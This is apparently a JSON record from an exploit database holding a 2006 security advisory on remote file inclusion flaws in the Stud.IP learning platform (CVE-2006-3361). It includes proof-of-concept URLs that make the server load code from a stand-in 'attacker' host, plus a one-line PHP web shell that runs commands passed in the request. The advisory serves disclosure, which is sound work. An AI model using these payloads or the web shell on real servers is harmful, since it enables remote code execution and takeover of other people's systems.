{
  "id": "1969",
  "title": "Stud.IP 1.3.0-2 - Multiple Remote File Inclusions",
  "cve": "CVE-2006-3361",
  "vuln_type": "rce",
  "code": "/*------------------------------------------------\r\n               IHS Public advisory\r\n-------------------------------------------------*/\r\n\r\nStud.IP Remote File Inclusion\r\nStud.IP is a learning and an information management\r\nsystem for universities, educational facilities and\r\nenterprises.\r\n\r\nhttp://www.studip.de\r\nhttp://www.data-quest.de\r\nhttp://www.sourceforge.net/projects/studip\r\n\r\n\r\nDiscovered by Hamid Ebadi Credit :\r\nall go to IHS team (IHS : IRAN HOMELAND SECURITY)\r\nwww.ihsteam.com (persian)\r\nwww.ihsteam.net (english)\r\n\r\n\r\nThe original article can be found at:\r\nhttp://www.hamid.ir/security/\r\nhttp://www.IHSteam.com\r\n\r\nVulnerable Systems:\r\n       studip 1.3.0-2 and below\r\n\r\n\r\nInput passed to the \"_PHPLIB[libdir]\" parameter in\r\nstudip-phplib/oohforms.inc and to the\r\n\"ABSOLUTE_PATH_STUDIP\"  parameter in\r\nstudip-htdocs/archiv_assi.php is not properly verified\r\nbefore being used to include files.\r\nThis can be exploited to execute arbitrary PHP code by\r\nincluding files from local or external resources.\r\n\r\nPOC Exploits:\r\n\r\nThe following URL will cause the server to include\r\nexternal files\r\nhttp://localhost/studip-1.3.0-2/studip-htdocs/archiv_assi.php?cmd=ls -al&ABSOLUTE_PATH_STUDIP=http://attacker/cmd.gif?\r\nhttp://localhost/studip-1.3.0-2/studip-phplib/oohforms.inc?cmd=ls -al&_PHPLIB[libdir]=http://attacker/cmd.gif?\r\n\r\ncmd.gif\r\n<?\r\npassthru($_GET['cmd']);\r\n?>\r\n\r\nSolution:\r\nEdit the source code to ensure that input is properly verified.\r\n\r\n\r\ngreeting :\r\nLorD , NT , C0d3r of IHS\r\n\r\n# milw0rm.com [2006-07-01]",
  "url": "https://www.exploit-db.com/exploits/1969"
}